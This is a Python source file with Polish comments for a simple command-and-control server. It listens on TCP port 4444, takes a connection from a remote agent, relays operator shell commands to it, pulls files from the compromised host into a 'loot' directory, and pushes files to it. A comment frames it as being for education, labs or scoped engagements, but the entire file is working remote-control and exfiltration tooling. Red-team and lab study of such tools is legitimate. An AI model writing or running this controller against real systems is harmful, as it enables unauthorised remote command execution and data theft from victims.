# language: Python, file: c2_server.py, runtime: Python 3.10+, target: kontroler (twoja maszyna)
# prosty serwer C2: nasłuchuje na TCP, przyjmuje jednego agenta, wysyła komendy, odbiera output
# użytek: edukacja / lab / engagement z podpisanym scope
import socket
import threading
import os
import sys
import time

HOST = "0.0.0.0"
PORT = 4444
BUFFER = 4096
DOWNLOAD_DIR = "loot"

os.makedirs(DOWNLOAD_DIR, exist_ok=True)

def recv_until(sock, marker=b"\n\n"):
    """Czyta aż do markera — potrzebne bo output komendy ma nieokreśloną długość."""
    data = b""
    while marker not in data:
        chunk = sock.recv(BUFFER)
        if not chunk:
            break
        data += chunk
    return data

def handle_client(conn, addr):
    print(f"[+] agent connected: {addr[0]}:{addr[1]}")
    try:
        # powitanie — agent wysyła sysinfo po połączeniu
        banner = recv_until(conn)
        print("[agent]", banner.decode(errors="replace").strip())

        while True:
            try:
                cmd = input("c2> ").strip()
            except EOFError:
                break
            if not cmd:
                continue

            if cmd == "exit":
                conn.sendall(b"exit\n\n")
                break

            if cmd.startswith("download "):
                # download <remote_path> — agent odeśle plik jako bajty po markerze
                conn.sendall((cmd + "\n\n").encode())
                header = recv_until(conn)
                # header zawiera "OK <size>\n\n"
                if header.startswith(b"OK "):
                    try:
                        size = int(header.split()[1])
                    except (IndexError, ValueError):
                        print("[-] zły header rozmiaru")
                        continue
                    fname = os.path.basename(cmd.split(" ", 1)[1])
                    local = os.path.join(DOWNLOAD_DIR, fname)
                    received = 0
                    with open(local, "wb") as f:
                        while received < size:
                            chunk = conn.recv(min(BUFFER, size - received))
                            if not chunk:
                                break
                            f.write(chunk)
                            received += len(chunk)
                    print(f"[+] zapisano {received} B -> {local}")
                else:
                    print("[agent]", header.decode(errors="replace").strip())
                continue

            if cmd.startswith("upload "):
                # upload <local_path> — agent czeka na rozmiar, potem bajty
                parts = cmd.split(" ", 1)
                if len(parts) < 2 or not os.path.isfile(parts[1]):
                    print("[-] brak pliku lokalnego")
                    continue
                local = parts[1]
                size = os.path.getsize(local)
                remote_name = os.path.basename(local)
                conn.sendall(f"upload {remote_name} {size}\n\n".encode())
                ack = conn.recv(BUFFER)
                if not ack.startswith(b"READY"):
                    print("[-] agent nie gotowy")
                    continue
                with open(local, "rb") as f:
                    while True:
                        chunk = f.read(BUFFER)
                        if not chunk:
                            break
                        conn.sendall(chunk)
                print(f"[+] wysłano {size} B -> {remote_name}")
                # odbierz potwierdzenie
                print("[agent]", recv_until(conn).decode(errors="replace").strip())
                continue

            # pozostałe komendy — jedna linia + marker \n\n, potem output aż do \n\n
            conn.sendall((cmd + "\n\n").encode())
            resp = recv_until(conn)
            print(resp.decode(errors="replace").rstrip())

    except (ConnectionResetError, BrokenPipeError):
        print(f"[-] agent {addr[0]} rozłączył się")
    finally:
        conn.close()

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind((HOST, PORT))
    srv.listen(5)
    print(f"[*] C2 listening on {HOST}:{PORT}")

    while True:
        conn, addr = srv.accept()
        t = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        t.start()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n[*] zamykam C2")
        sys.exit(0)